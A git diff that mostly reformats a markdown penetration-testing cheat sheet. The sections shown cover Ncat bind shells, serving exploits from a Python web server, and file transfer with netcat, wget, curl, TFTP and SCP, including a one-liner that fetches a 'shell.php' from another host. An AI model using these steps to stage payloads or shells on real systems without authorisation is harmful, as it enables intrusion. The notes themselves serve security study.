@@ -149,7 +149,7 @@ This is what hackers mean by popping shells, but usually it's getting a web serv
 
 ## Ncat
 
-It's like netcat, but can encrypt connections and restrict access. 
+It's like netcat, but can encrypt connections and restrict access.
 
 Taking the example of Bob \(Windows\) setting up a bind shell so that only Alice \(Linux\) could connect to it via SSL, his listener would look like this:
 
@@ -166,13 +166,16 @@ ncat -v [bob] 443 --ssl
 ## File transfer
 
 ### Python
-You'll use python's web server all the time to transfer exploits and move files between machines (or possibly even within machines). Pay attention to the port you use, as it may interfere with shells or firewalls:
 
-```
+You'll use python's web server all the time to transfer exploits and move files between machines \(or possibly even within machines\). Pay attention to the port you use, as it may interfere with shells or firewalls:
+
+```text
 cd exploits
 python -m SimpleHTTPServer 80
 ```
+
 ### Netcat
+
 To transfer files, set up a listener and redirect the output to a filename:
 
 ```text
@@ -182,37 +185,52 @@ listening on [any] 443...
 nc -nv [host] 443 < nc.exe # sending machine pushes file
 (UNKNOWN) [host] 443 (?) open
 ```
+
 ### Wget
 
 Download files from another machine:
-```
+
+```text
 wget [host]:8080/test.txt
 ```
-### Curl 
+
+### Curl
+
 Download files from another machine, such as webpages:
-```
+
+```text
 curl -O http://[host]/file.txt
 ```
 
 ### TFTP
+
 TFTP works more or less like FTP:
-```
+
+```text
 tftp [host]
 tftp> get file.txt
 ```
+
 If it can't be run interactively, this one-liner might work:
-```
+
+```text
 tftp [host] <<< "get shell.php shell.php"
 ```
+
 ### SCP
+
 Copy a file:
-```
+
+```text
 scp /path/to/source/file.ext username@host:/path/to/destination/file.ext
 ```
+
 Copy a directory:
-```
+
+```text
 scp -r /path/to/source/dir username@host:/path/to/destination
 ```
+
 ## Further reading
 
 * [Linux Journey](https://linuxjourney.com/)
